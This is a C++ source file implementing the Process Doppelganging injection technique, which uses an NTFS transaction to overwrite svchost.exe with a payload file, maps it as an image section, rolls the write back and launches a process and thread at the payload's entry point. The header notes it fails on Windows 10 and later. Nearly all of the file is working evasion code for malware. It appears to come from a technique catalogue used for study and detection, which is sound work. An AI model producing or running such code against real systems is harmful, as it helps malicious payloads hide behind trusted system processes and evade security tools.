/*
Title: Process Doppelganging
Resources:
	- https://github.com/hasherezade/process_doppelganging
	- https://unprotect.it/technique/process-doppelganging/
Status: This technique no longer works on Windows 10 or later due to ERROR_ACCESS_DENIED for NtCreateThreadEx function. See https://github.com/hasherezade/process_doppelganging/issues/3
*/

#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include "ProcessDoppelganging.hpp"

_NtAllocateVirtualMemory ntAllocateVirtualMemory = nullptr;
_NtClose ntClose = nullptr;
_NtCreateProcessEx ntCreateProcessEx = nullptr;
_NtCreateSection ntCreateSection = nullptr;
_NtCreateThreadEx ntCreateThreadEx = nullptr;
_NtCreateTransaction ntCreateTransaction = nullptr;
_NtFreeVirtualMemory ntFreeVirtualMemory = nullptr;
_NtQueryInformationProcess ntQueryInformationProcess = nullptr;
_NtReadVirtualMemory ntReadVirtualMemory = nullptr;
_NtRollbackTransaction ntRollbackTransaction = nullptr;
_NtWriteVirtualMemory ntWriteVirtualMemory = nullptr;
_RtlCreateProcessParametersEx rtlCreateProcessParametersEx = nullptr;
_RtlDestroyProcessParameters rtlDestroyProcessParameters = nullptr;
_RtlImageNtHeader rtlImageNtHeader = nullptr;

VOID FreeAll(
	HMODULE hNtdll,
	HANDLE hTransaction,
	HANDLE hTransactedFile,
	HANDLE hFile,
	HANDLE hSection,
	HANDLE hProcess,
	HANDLE hThread,
	PVOID buffer,
	PSIZE_T pFileSize,
	PRTL_USER_PROCESS_PARAMETERS_T pProcessParams
) {
	if (hNtdll)
		FreeLibrary(hNtdll);
	if (hTransaction)
		CloseHandle(hTransaction);
	if (hTransactedFile)
		CloseHandle(hTransactedFile);
	if (hFile)
		CloseHandle(hFile);
	if (hSection)
		CloseHandle(hSection);
	if (hProcess)
		CloseHandle(hProcess);
	if (hThread)
		CloseHandle(hThread);
	if (buffer) {
		ntFreeVirtualMemory(NtCurrentProcess(), &buffer, pFileSize, MEM_RELEASE);
	}
	if (pProcessParams)
		rtlDestroyProcessParameters((PRTL_USER_PROCESS_PARAMETERS)pProcessParams);
}

BOOL GetFunctions(HMODULE hNtdll) {
	ntAllocateVirtualMemory = reinterpret_cast<_NtAllocateVirtualMemory>(GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));
	if (!ntAllocateVirtualMemory) return FALSE;
	ntClose = reinterpret_cast<_NtClose>(GetProcAddress(hNtdll, "NtClose"));
	if (!ntClose) return FALSE;
	ntCreateProcessEx = reinterpret_cast<_NtCreateProcessEx>(GetProcAddress(hNtdll, "NtCreateProcessEx"));
	if (!ntCreateProcessEx) return FALSE;
	ntCreateSection = reinterpret_cast<_NtCreateSection>(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!ntCreateSection) return FALSE;
	ntCreateThreadEx = reinterpret_cast<_NtCreateThreadEx>(GetProcAddress(hNtdll, "NtCreateThreadEx"));
	if (!ntCreateThreadEx) return FALSE;
	ntCreateTransaction = reinterpret_cast<_NtCreateTransaction>(GetProcAddress(hNtdll, "NtCreateTransaction"));
	if (!ntCreateTransaction) return FALSE;
	ntQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (!ntQueryInformationProcess) return FALSE;
	ntReadVirtualMemory = reinterpret_cast<_NtReadVirtualMemory>(GetProcAddress(hNtdll, "NtReadVirtualMemory"));
	if (!ntReadVirtualMemory) return FALSE;
	ntRollbackTransaction = reinterpret_cast<_NtRollbackTransaction>(GetProcAddress(hNtdll, "NtRollbackTransaction"));
	if (!ntRollbackTransaction) return FALSE;
	ntWriteVirtualMemory = reinterpret_cast<_NtWriteVirtualMemory>(GetProcAddress(hNtdll, "NtWriteVirtualMemory"));
	if (!ntWriteVirtualMemory) return FALSE;
	rtlCreateProcessParametersEx = reinterpret_cast<_RtlCreateProcessParametersEx>(GetProcAddress(hNtdll, "RtlCreateProcessParametersEx"));
	if (!rtlCreateProcessParametersEx) return FALSE;
	rtlDestroyProcessParameters = reinterpret_cast<_RtlDestroyProcessParameters>(GetProcAddress(hNtdll, "RtlDestroyProcessParameters"));
	if (!rtlDestroyProcessParameters) return FALSE;
	rtlImageNtHeader = reinterpret_cast<_RtlImageNtHeader>(GetProcAddress(hNtdll, "RtlImageNtHeader"));
	if (!rtlImageNtHeader) return FALSE;

	return TRUE;
}

BOOL ProcessDoppelganging() {
	LPCWSTR evilPath = L"C:\\evil.exe"; // Replace it with your own file path to inject.
	LPCWSTR targetPath = L"C:\\Windows\\System32\\svchost.exe"; // Replace it with the target path to be injected.

	HANDLE hTransaction = nullptr;
	HANDLE hTransactedFile = nullptr;
	HANDLE hFile = nullptr;
	HANDLE hSection = nullptr;
	HANDLE hProcess = nullptr;
	HANDLE hThread = nullptr;
	PVOID buffer = nullptr;
	NTSTATUS status;
	LARGE_INTEGER fileSizeLarge;
	SIZE_T fileSize = 0;

	PROCESS_BASIC_INFORMATION pbi;
	PRTL_USER_PROCESS_PARAMETERS_T pProcessParams = nullptr;
	UNICODE_STRING ustr;

	HMODULE hNtdll = (HMODULE)LoadLibraryA("ntdll.dll");
	if (!hNtdll) return FALSE;
	if (!GetFunctions(hNtdll)) return FALSE;

	BYTE temp[0x1000];
	RtlSecureZeroMemory(&temp, sizeof(temp));

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

	// Create TmTx transaction object.
	status = ntCreateTransaction(
		&hTransaction,
		TRANSACTION_ALL_ACCESS,
		&oa,
		nullptr,
		nullptr,
		0,
		0,
		0,
		nullptr,
		nullptr
	);
	if (!NT_SUCCESS(status)) return FALSE;
		
	// Open the target file for transaction.
	hTransactedFile = CreateFileTransacted(
		targetPath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr,
		hTransaction,
		nullptr,
		nullptr
	);
	if (!hTransactedFile || hTransactedFile == INVALID_HANDLE_VALUE) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, hFile, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Open the payload file.
	hFile = CreateFile(
		evilPath,
		GENERIC_READ,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (!hFile) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, hFile, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	if (!GetFileSizeEx(hFile, &fileSizeLarge)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, hFile, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Allocate buffer for the payload.
	fileSize = (SIZE_T)fileSizeLarge.LowPart;
	status = ntAllocateVirtualMemory(
		NtCurrentProcess(),
		&buffer,
		0,
		&fileSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, hFile, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Read the payload.
	DWORD dwBytesRead = 0;
	if (!ReadFile(hFile, buffer, fileSizeLarge.LowPart, &dwBytesRead, nullptr)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, hFile, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	CloseHandle(hFile);
	hFile = nullptr;

	// Write buffer into the transaction.
	DWORD dwBytesWritten = 0;
	if (!WriteFile(hTransactedFile, buffer, fileSizeLarge.LowPart, &dwBytesWritten, nullptr)) {
		printf("Error: %d\n", GetLastError());
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Create section from transacted file.
	status = ntCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		nullptr,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hTransactedFile
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	status = ntRollbackTransaction(hTransaction, TRUE);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	ntClose(hTransaction);
	hTransaction = nullptr;

	CloseHandle(hTransactedFile);
	hTransactedFile = INVALID_HANDLE_VALUE;

	// Create process object with transacted section.
	hProcess = nullptr;
	status = ntCreateProcessEx(
		&hProcess,
		PROCESS_ALL_ACCESS,
		nullptr,
		NtCurrentProcess(),
		PS_INHERIT_HANDLES,
		hSection,
		nullptr,
		nullptr,
		FALSE
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Query the payload file entry point value.
	ULONG dwReturnLength = 0;
	status = ntQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	status = ntReadVirtualMemory(hProcess, pbi.PebBaseAddress, &temp, 0x1000, &fileSize);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	ULONG_PTR upEntryPoint = (ULONG_PTR)rtlImageNtHeader(buffer)->OptionalHeader.AddressOfEntryPoint;
	upEntryPoint += (ULONG_PTR)((PPEB_T)temp)->ImageBaseAddress;
	
	// Create process parameters block.
	RtlInitUnicodeString(&ustr, targetPath);
	status = rtlCreateProcessParametersEx(
		(PRTL_USER_PROCESS_PARAMETERS*)&pProcessParams,
		&ustr,
		nullptr,
		nullptr,
		&ustr,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Allocate memory in target process and write process parameters block.
	fileSize = pProcessParams->EnvironmentSize + pProcessParams->MaximumLength;
	PVOID memPtr = pProcessParams;

	status = ntAllocateVirtualMemory(
		hProcess,
		&memPtr,
		0,
		&fileSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	fileSize = 0;
	status = ntWriteVirtualMemory(
		hProcess,
		pProcessParams,
		pProcessParams,
		pProcessParams->EnvironmentSize + pProcessParams->MaximumLength,
		&fileSize
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Update PEB->ProcessParameters pointer to newly allocated block.
	PEB* pPeb = pbi.PebBaseAddress;
	status = ntWriteVirtualMemory(
		hProcess,
		&pPeb->ProcessParameters,
		&pProcessParams,
		sizeof(PVOID),
		&fileSize
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	// Create primary thread
	// The NtCreateThreadEx is not working...
	hThread = nullptr;
	status = ntCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		hProcess,
		(LPTHREAD_START_ROUTINE)upEntryPoint,
		nullptr,
		FALSE,
		0,
		0,
		0,
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hTransaction, hTransactedFile, nullptr, hSection, hProcess, hThread, buffer, &fileSize, pProcessParams);
		return FALSE;
	}

	return TRUE;
}
